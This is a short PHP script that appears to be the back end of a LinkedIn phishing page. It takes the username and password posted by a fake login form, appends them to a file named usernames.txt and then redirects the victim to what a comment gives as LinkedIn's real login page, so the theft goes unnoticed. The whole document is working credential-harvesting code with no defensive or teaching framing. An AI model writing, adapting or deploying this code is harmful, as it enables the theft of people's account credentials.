<?php

file_put_contents("usernames.txt", "Linkedin Username: " . $_POST['session_key'] . "\nPassword: " . $_POST['session_password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.linkedin.com/login
header("Location: $url");
exit();
?>